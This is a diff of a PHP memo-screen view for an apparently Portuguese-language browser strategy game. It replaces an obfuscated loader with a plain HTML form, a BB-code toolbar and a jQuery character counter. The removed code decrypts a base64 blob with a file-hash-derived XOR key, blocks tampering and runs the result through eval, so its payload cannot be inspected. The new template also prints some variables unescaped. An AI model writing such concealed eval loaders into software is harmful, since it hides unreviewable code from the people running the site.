@@ -1,24 +1,82 @@
 <?php
-$khrlxcggzo="8c4522916d2f5ce5a37922cddda03911";
-$okhfavbbr="0e510c0502535a050756560401015d000406535d5702055050055107515b5557";
-$negvpic="TuitZv0PgAIhjGOqDy6tWUEyf60sB47iiyGCCobSCbczQBE6s0MKvyp4cCr+0w/9tsE0kFzCBA+QxXS5f8GRo9TC26ADkq5zv5QBNCp8HJLCsmMUb68fmtRq5at1Ek+eC675fW4L1tA9XN1Udnc2onkrKEPiN0WDLKUslX0aOrxDRvSFZtu0L7GpYp65+mA38PH8FYUX5f1cW7Yt6so15LZVb4xQA12w7IwpJx1V3hiK+BCH2imL7zUs6bjxSc3ONPTZZ1XoehFZwDesh9NT/KJ0Loy4cs2eVAZkfsdlFFLJ8geURGnK5r2Rhd5o42lnVQ2e7TiukUW/8wAR6Geqk/3nKEKSdsEMeqfRSFvueS7jhD5x7vlBdf0BpAPBvXH4nAB88+W0ugE/Pp62MIRy0qGXvZRvHDltIaJfFydMSOGRTWUcpxDc6za4DAiNhB7z5a9QhPJDZgy3pCwwafCXfgUBZToZqOG7TMj+o6vDWNQ6rcl3hglX+qV+F/owrOBb/1hERve2az8R1VIxWH6s/73SlEgsFQnfgHUWtxmjCFA4/MPNR0zJctv8zNRQ4nECQPTXOmGjOURnbY0e9K/e7aW/7euOC0jvwdV2YA8c5c/aG7kBwkRd407HjQodju4gAhUPPPZxhfxi/hFa6NGa4RkbMlFfZ9VJbDBgbkNlAtV5BUf8VnEgrPVDJjdqyLoisxENLvR9VZ+gLblBp23jHbgJRRPk9zLvR/k6NUXZDJZTPET0S31oNhzxvln6yaSxXy5E3DfBtglPb4Q1Z3D3qmTJmJW4gAjM+IdoYyxn9VIV6Hz3DjAK7sIgtAyCpxaDTjU18PA13RqN8qUjeUnkQ6cnNo8g2A/NJobwLFlzVHKpg1NnR/VkvZOkEoTZSlAU8sYhQWGtS74/0J7KPQqndWeivLweR4yQLl5t1FuPLzr55eXfA7lDVp5VrI4hXnimNnoLrN0LBA9Wo6SlzmUsSB84RqaSCb05sGS+Wg1OrR01UhKuRK6RbcgV3cSg2xgSkVj30r4k1hzqlt8QET3xp7Fj882GuE9u0SnQae7nAI1ebC1uuMO9dyz/sfdjq2Ahp3NrS0zxrBuM5DGzJQ/L20mrHW/5CzXVo2vBR1a+AMSGAZHZlCr9YnZbVdiA38k7ZtEnS/M3P6Y1nNckuKPvoY5PwulkmvQl/3za7a8lWY4y0iAXwScllbxsBorxqvGdctaopgMtI0SUdsoXrMdXJG6dO0IHypANwKa+ulrFN18pIR7e4d9H4KjkbVjtosGHyeFxGsEDvkDilsqc724uPnjj6e2KofRfjyfnssmHj4KDLI9Cuhc8IRWsgzf53uzA7k5uuG9jB7dKQn/IXp/J/JHyR4uMJ8zAvN8fWfjVZzIKikfS4fU7g2q6prVNVaDflTa1OoRrkymoztIi";
-$ddanoheqy=file_get_contents(__FILE__);
-$bonwmuo=str_replace($negvpic,"",$ddanoheqy);
-if(strpos($bonwmuo,"ec"."ho")!==false||strpos($bonwmuo,"pr"."int")!==false||strpos($bonwmuo,"var_"."dump")!==false||strpos($bonwmuo,"file_put_"."contents")!==false||strpos($bonwmuo,"fw"."rite")!==false){die();}
-$vdabrsw=str_replace(array($khrlxcggzo,$okhfavbbr),array("SP_7684efad","KP_9b4b2753"),$ddanoheqy);
-$nmcctim=md5($vdabrsw);
-$xrqelrc=hex2bin($okhfavbbr);
-$jbhcvns="";
-$bhhobaezz=strlen($nmcctim);
-for($fpnjys=0;$fpnjys<$bhhobaezz;$fpnjys++){
-$jbhcvns.=chr(ord($xrqelrc[$fpnjys])^ord($nmcctim[$fpnjys]));
-}
-$czorpxnjfg=base64_decode($negvpic);
-$ovjdony=strlen($czorpxnjfg);
-$iyxispz="";
-$kacyudkvs=strlen($jbhcvns);
-for($fpnjys=0;$fpnjys<$ovjdony;$fpnjys++){
-$iyxispz.=$czorpxnjfg[$fpnjys]^$jbhcvns[$fpnjys%$kacyudkvs];
-}
-$micubqq="gzun"."compress";
-eval('?>' . $micubqq($iyxispz) . '<?php ');
+/**
+ * Memo Screen View - Improved Version
+ */
+?>
+<?php if (!empty($error)): ?>
+    <div class="error"><?= $error ?></div>
+<?php endif; ?>
+<?php if (!empty($success)): ?>
+    <div class="success"><?= $success ?></div>
+<?php endif; ?>
+
+<h3>Bloco de Notas</h3>
+
+<div style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 10px; margin-bottom: 10px;">
+    <strong>Dica:</strong>Pode usar BB-Codes para formatar seu texto. O limite é de 5.000 caracteres.
+</div>
+
+<form action="game.php?village=<?= $village['id'] ?>&screen=memo&action=edit&h=<?= $hkey ?>" method="post">
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="2">Editar Notas</th>
+        </tr>
+        <tr>
+                <td colspan="2">
+
+                    <div style="margin-bottom: 15px;">
+                        <?php 
+                        $textareaId = 'message';
+                        $prefix = 'memo_';
+                        include __DIR__ . '/../components/bbcode_toolbar.php'; 
+                        ?>
+                    </div>
+                </td>
+            </tr>
+        <tr><textarea id="message" name="memo" cols="80" rows="20" style="width: 98%;"><?= htmlspecialchars($memo_bb) ?></textarea>
+            <td>
+                <input type="submit" value="Salvar Notas" class="btn">
+            </td>
+            <td align="right">
+                <span id="char_count">0</span> / 5000
+            </td>
+        </tr>
+    </table>
+</form>
+
+<style>
+    .color-box { width: 15px; height: 15px; display: inline-block; cursor: pointer; border: 1px solid #000; margin-right: 2px; }
+</style>
+
+<script type="text/javascript">
+$(document).ready(function(){
+    BBCodes.init({
+        target : '#message',
+        ajax_unit_url: 'ajax/unit_bb.php',
+        ajax_building_url: 'ajax/build_bb.php'
+    });
+
+    // Character counter
+    function updateCharCount() {
+        var len = $('#message').val().length;
+        $('#char_count').text(len);
+        if (len > 5000) {
+            $('#char_count').css('color', 'red');
+        } else {
+            $('#char_count').css('color', 'black');
+        }
+    }
+    $('#message').on('input propertychange', updateCharCount);
+    updateCharCount();
+});
+</script>
+
+<br>
+<h3>Visualização</h3>
+<table class="vis" width="100%">
+    <tr>
+        <td style="background-color: #fff; padding: 10px; border: 1px solid #7d510f;">
+            <?= $memo_viev ?>
+        </td>
+    </tr>
+</table>
